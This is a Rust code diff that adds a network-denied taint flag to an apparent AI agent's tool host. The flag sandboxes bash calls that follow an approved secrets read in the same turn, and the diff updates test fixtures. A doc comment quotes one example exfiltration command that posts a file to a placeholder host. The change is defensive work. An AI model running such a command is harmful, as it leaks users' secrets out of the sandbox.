@@ -92,6 +92,13 @@ pub struct ToolHostRequest {
     /// (Invariant F). `Some` ⇒ the daemon re-validates every L-rule (origin, expiry,
     /// call_id, canonical tier) before relaxing exactly one Host-bash read-deny leaf.
     pub security_override: Option<SecurityOverride>,
+    /// (Security-override Wave 2, FLAW-1 turn taint) When `true`, a Host-tier `bash`
+    /// call runs network-denied + workspace-write-only INDEPENDENTLY of any override
+    /// — Swift sets it on every bash that follows an approved Secrets-tier read in
+    /// the SAME turn, so the read secret cannot be exfiltrated by a later split call
+    /// (`curl -d @/tmp/x evil`). `false` ⇒ today's behavior, byte-identical
+    /// (Invariant F). Honored only on Host bash; jailed calls already confine egress.
+    pub network_denied: bool,
 }
 
 /// A human-gated, single-call sandbox override (the wire contract's top-level
@@ -753,7 +760,20 @@ impl ToolHost {
             OverrideDecision::Relax(r) => Some(r),
             OverrideDecision::None | OverrideDecision::Rejected => None,
         };
-        match isolation::wrap_host_bash_command(command, self.home.as_deref(), relax) {
+        // FLAW-1 turn taint: a network-denied bash (Swift sets this on every bash
+        // after an approved Secrets read in the turn) confines writes to the
+        // workspace root + temp and denies network, independent of any override.
+        let network_denied_root: Option<&std::path::Path> = if req.network_denied {
+            Some(self.root.as_path())
+        } else {
+            None
+        };
+        match isolation::wrap_host_bash_command(
+            command,
+            self.home.as_deref(),
+            relax,
+            network_denied_root,
+        ) {
             Ok(wrapped) => {
                 let mut input = req.input.clone();
                 if let Value::Object(map) = &mut input {
@@ -1433,6 +1453,7 @@ mod tests {
             cancel: CancellationToken::new(),
             origin: ToolOrigin::OwnerInteractive,
             security_override: None,
+            network_denied: false,
         };
         let res = host.execute(req).await.expect("allowed + ran");
         assert!(!res.output.content.is_empty());
@@ -1456,6 +1477,7 @@ mod tests {
             cancel: CancellationToken::new(),
             origin: ToolOrigin::OwnerInteractive,
             security_override: None,
+            network_denied: false,
         };
         let err = host.execute(req).await.unwrap_err();
         assert!(matches!(err, ToolHostError::Denied(_)));
@@ -1490,6 +1512,7 @@ mod tests {
             cancel: CancellationToken::new(),
             origin,
             security_override: None,
+            network_denied: false,
         }
     }
 
@@ -2715,6 +2738,7 @@ mod tests {
             cancel: CancellationToken::new(),
             origin,
             security_override: ov,
+            network_denied: false,
         }
     }
 
